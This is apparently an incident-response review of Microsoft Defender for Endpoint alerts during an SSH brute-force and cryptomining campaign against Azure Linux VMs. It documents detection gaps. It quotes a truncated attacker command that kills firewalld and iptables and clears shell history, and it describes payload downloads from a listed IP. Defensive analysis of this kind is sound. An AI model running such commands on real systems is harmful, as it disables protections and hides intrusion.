# MDE Dashboard Review

This file summarizes alerts, incidents, and automated detections surfaced by Microsoft Defender for Endpoint (MDE) during the SSH brute-force campaign observed in March–April 2025.

The objective is to assess MDE’s automated coverage and correlate it with findings from manual threat hunting documented in `initial-threat-hunt.md`.

---

## Incidents Timeline

| Date & Time (UTC)     | Incident Title                                                   | Affected Device                                |
|-----------------------|------------------------------------------------------------------|------------------------------------------------|
| February 17, 2025     | Unusual SSH authentication behavior                             | Linux-VulnMgmt-Kobe                            |
| February 18–20, 2025  | Lateral movement and brute-force attempts across tenant          | Multiple Azure VMs                             |
| March 17, 2025 15:36  | Possible SSH brute-force attack                                  | sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd       |
| March 18, 2025        | Connection to malicious domain (dinpasiune.com)                  | jr-linux-vm-test                               |
| March 18–April 3, 2025| Sustained brute-force & mining activity                          | linuxvmcraig, linux-vulnerability-test-dylan   |

---

## Alert Storyline and Timeline of Detection

### February 17, 2025 — Initial Indicator of Compromise

**Device Involved:** `Linux-VulnMgmt-Kobe`  
**Time:** 8:37 PM  
**Activity:** Multiple failed SSH logon attempts followed by a successful brute-force login attempt from a Microsoft Azure IP.

**Note:** *The user had intentionally exposed the device to internet-facing SSH access. The SSH daemon was started, and after numerous failed logon attempts, a successful connection was made from IP `20.80.241.91` — a Microsoft Azure cloud address not inherently malicious. Malicious behavior was observed immediately after this connection, marking the initial indicator of compromise.*

<p align="center">
  <img src="https://github.com/user-attachments/assets/9d1387fd-0dfe-47ed-b662-f961fc7cc5ab" alt="Screenshot description" width="500"/>
  <img src="https://github.com/user-attachments/assets/cac9b34b-0d24-4e30-aeb5-9cc31a8d8bd1" alt="Screenshot description" width="500"/>
</p>

**Observed Command:**

```bash
-c "pkill firewalld  -9;pkill iptables -9;ulimit -e 999999;... rm -rf .bash_history; history -c
```
[View full command → `observed-commands.md`](./observed-commands.md#bisis-ssh-brute-force-command)

**Command Breakdown:**
- Disables local firewall protections by terminating `firewalld` and `iptables`
- Increases system resource limits with `ulimit`
- Downloads and executes multiple payloads from `194.32.145.243` using `wget`, `curl`, and `tftp`
- Cleans execution traces by deleting shell history and temporary files

<p align="center">
  <img src="https://github.com/user-attachments/assets/09a6b57f-0c77-49c0-b4fd-a39ba10e0a95" alt="Screenshot description" width="525"/>
  <img src="https://github.com/user-attachments/assets/c7ed4c85-88ff-4c10-bcb9-3c6356c5a814" alt="Screenshot description" width="475"/>
  <img src="https://github.com/user-attachments/assets/b00a6d04-c1cc-4442-af3a-4e373333d025" alt="Screenshot description" width="600"/>
</p>

**File Activity:** Execution of `logsbins.sh` triggered creation of multiple files named sequentially from `b` to `o`. Each of these files is distinct and has been flagged as malicious.

**Malware Association:** These alphabetically named files are linked to the **Gafgyt** botnet, commonly used to conscript infected systems into coordinated botnet operations.

**VirusTotal Scores:**
- IP `194.32.145.243`: `12/94`
- File `b`: `44/64` (add link to virustotal-summary)

---

### February 18-19, 2025 — Lateral Movement and Persistence Activity

#### February 18, 2025

**Devices Involved:**  
- `Linux-VulnMgmt-Kobe`  
- `linux-ubuntu-lab`  
- `ed-linux`

**Activity:**  
The device `Linux-VulnMgmt-Kobe` (IP `10.0.0.160`) began making repeated login attempts to other virtual machines within the tenant network. This activity triggered detection alerts for an **unusual number of failed sign-in attempts**.

**Screenshot Context:**
<p align="center">
  <img src="https://github.com/user-attachments/assets/6e52e8a7-ea19-4d40-b56d-566a20b9dc29" alt="Login Attempts Timeline" width="250"/>
  <img src="https://github.com/user-attachments/assets/22ac491f-e4fe-44db-9e88-f6e52e72d229" alt="Failed SSH Attempts on VM" width="400"/>
</p>
<p align="center">
  <img src="https://github.com/user-attachments/assets/316a6aef-1dfd-431e-84ed-8d8f0bf029c9" alt="Expanded Device Activity" width="700"/>
  <img src="https://github.com/user-attachments/assets/dc5d668b-7ec7-4192-8f5c-71211caca724" alt="Detailed SSH Activity" width="700"/>
</p>

**Behavior Observed:**  
- Device `Linux-VulnMgmt-Kobe` initiated multiple SSH brute-force attempts within the Azure tenant.
- The failed sign-in attempts suggest the attacker was systematically probing for weak SSH credentials.

---

**The compromise of the `Linux-VulnMgmt-Kobe` device on February 18 set the stage for subsequent lateral movement throughout the Azure tenant environment. Attackers leveraged the initial breach to pivot across the network, targeting additional virtual machines in the tenant infrastructure. This activity marked the start of a broader campaign of internal reconnaissance and credential harvesting aimed at expanding their foothold.**

---

#### February 19, 2025

**Device Involved:**  
- `Linuz-scan-agent`

**Activity:**  
The device `Linuz-scan-agent`  was subjected to a similar pattern of brute-force attempts.  After numerous failed logon attempts, an attacker successfully gained access. Subsequently, the device began using the `cron` service to schedule execution of a file named `VwIEbFMroMSrleiJ`.

**File Details:**  
The file `VwIEbFMroMSrleiJ` shares the same obfuscated naming style as `UpzBUBnv` observed in previous threat-hunt findings (`initial-threat-hunt.md`).

**Screenshot Context:**
<p align="center">
  <img src="https://github.com/user-attachments/assets/3e4963e2-b321-4034-b902-e7eb4386d9fe" alt="Cron Execution Evidence" width="700"/>
  <img src="https://github.com/user-attachments/assets/d904a958-88d6-45ca-ad35-9178bfeb5487" alt="File Ingress Events" width="700"/>
  <img src="https://github.com/user-attachments/assets/fa2da0dc-a09d-4898-9ee9-2949eb4f594f" alt="Detailed Process Timeline" width="700"/>
</p>

**Additional Context:**  
Subsequent research confirmed that `VwIEbFMroMSrleiJ` is an ELF file associated with the **Gafgyt botnet**. It was scheduled via `cron` to execute every minute for a 10-minute interval, suggesting automated persistence and a potential for repeated malicious activity.

**VirusTotal Scores:**
- File `VwIEbFMroMSrleiJ`: **14/64**

---






---

### February 20, 2025 — Lateral Movement Begins

Still without MDE alerts, malware on `Levi-Linux-Vulnerability` initiated peer-to-peer propagation using the FritzFrog (Multiverse) trojan family. Scripts named `retea`, `Update`, and `network` were executed, deploying mining payloads and persistence mechanisms. Files such as `diicot`, `kuak`, and `cache` were dropped.

> ❗ MDE failed to detect or surface alerts for this lateral movement or file ingress. Infection paths were only uncovered through KQL-based manual threat hunting.

---

### March 17, 2025 — First Automated Detection

**Alert**: *Possible SSH brute-force attack*  
**Device**: sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net  
**Timestamp**: March 17, 2025 @ 15:36 UTC  

**Summary**:  
MDE finally raised an alert for brute-force behavior after over **85,000** outbound SSH connection attempts were made using the `.bisis` executable. However, manual hunting had previously confirmed this behavior began on **March 14**, meaning this was a **delayed detection**.  

<p align="center"> <img src="<!-- Screenshot: SSH brute-force alert from MDE dashboard -->" alt="SSH brute-force alert in MDE" width="800"/> </p>

> 🔁 Correlates directly with findings in `initial-threat-hunt.md` under the section covering `.bisis` command behavior.

---

### March 18, 2025 — Outbound C2 Alert

**Alert**: *Connection to known malicious domain*  
**Device**: jr-linux-vm-test.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net  
**Timestamp**: March 18, 2025 (Time unspecified)  

**Summary**:  
MDE flagged a connection to the domain `dinpasiune.com`, which had a VirusTotal score of 12/94. This domain was referenced in the `./retea` and `./network` scripts used to fetch additional payloads. The alert correctly identified the C2 beaconing attempt but did **not flag the scripts**, such as `retea`, or the downloaded file `cache`.

<p align="center"> <img src="<!-- Screenshot: C2 domain alert in MDE -->" alt="C2 alert in MDE" width="800"/> </p>

> 🔁 This aligns with the manual discovery of beaconing behavior using `curl` commands found in the Update script chain.

---

### March 18–April 3, 2025 — Persistence and Propagation

No additional alerts were generated by MDE for:
- Execution of malicious files such as `UpzBUBnv`, `kuak`, or `diicot`
- Scheduled cron jobs for `.b` or `Update`
- SSH inbound connections from suspicious IPs (e.g., `65.49.1.121`, score: 9/94)

Devices including `linuxvmcraig` and `linux-vulnerability-test-dylan` continued to exhibit brute-force behavior and payload execution patterns similar to those previously documented, but **MDE surfaced no alerts for these hosts**.

> ❗ Indicates a lack of telemetry-based correlation across hosts despite reused scripts, file names, and infrastructure.

---

## Gaps and Observations

### 🔍 Strengths
- MDE successfully detected:
  - High-volume SSH brute-force activity once a threshold was reached (March 17 alert)
  - Connections to known malicious domains (e.g., `dinpasiune.com`)
- Correlation between network behavior and some known C2 infrastructure was effective.

### 🚨 Gaps
- **Delayed detection**: Brute-force attempts began March 14; MDE only triggered alerts on March 17.
- **Missed early-stage persistence**: Initial execution of `Update`, `.b`, and `History` was not flagged.
- **Limited visibility into lateral movement**: Even with similar behaviors across five VMs, MDE only surfaced alerts on two.
- **No behavioral alerting on ELF-based mining payloads**: Despite multiple VirusTotal-flagged binaries (e.g., `kuak` scored 31/64), no execution-level alerts were generated.
- **Script-based attacks flew under radar**: Custom cron jobs, obfuscated bash payloads, and curl-based exfiltration were not surfaced.

### 🧭 Manual Correlation Gained Visibility
The threat-hunting methodology outlined in `initial-threat-hunt.md` revealed:
- Early infection vectors  
- The full lifecycle of deployed payloads  
- Coordinated lateral movement  
- Reused persistence tactics across multiple hosts

> Without this, the majority of Diicot’s activity would have gone undetected by MDE alone.

---


